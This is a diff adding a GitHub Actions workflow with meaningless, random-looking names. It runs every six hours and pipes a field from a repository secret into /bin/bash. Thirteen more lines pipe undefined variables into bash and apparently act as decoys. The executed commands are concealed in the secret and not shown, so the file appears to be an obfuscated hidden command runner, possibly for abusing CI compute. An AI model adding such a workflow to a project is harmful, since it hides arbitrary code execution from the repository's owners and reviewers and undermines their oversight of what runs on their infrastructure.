@@ -1,0 +1,30 @@
+name: wangmiaozhen1234
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wangmiaozhen1234
+        env:
+          auy762: ${{ secrets.auy762 }}
+        run: |
+          echo $auy762 | jq -r .smqcd63 | /bin/bash
+          echo $fsrlp64230 | jq -r .agz9 | /bin/bash
+          echo $d0923 | jq -r .rzb583 | /bin/bash
+          echo $ltqm840 | jq -r .rqyfx41132 | /bin/bash
+          echo $q72 | jq -r .ciyxb6871 | /bin/bash
+          echo $rsuv28 | jq -r .onzja424 | /bin/bash
+          echo $fkeml45 | jq -r .ae992 | /bin/bash
+          echo $fz0963 | jq -r .mbt16009 | /bin/bash
+          echo $bb18009 | jq -r .kgh0 | /bin/bash
+          echo $pdi35 | jq -r .r9694 | /bin/bash
+          echo $oe984 | jq -r .tafs9797 | /bin/bash
+          echo $gghud501 | jq -r .l6312 | /bin/bash
+          echo $etlx4 | jq -r .q83 | /bin/bash
+          echo $hoeb32 | jq -r .bqczp0 | /bin/bash
+
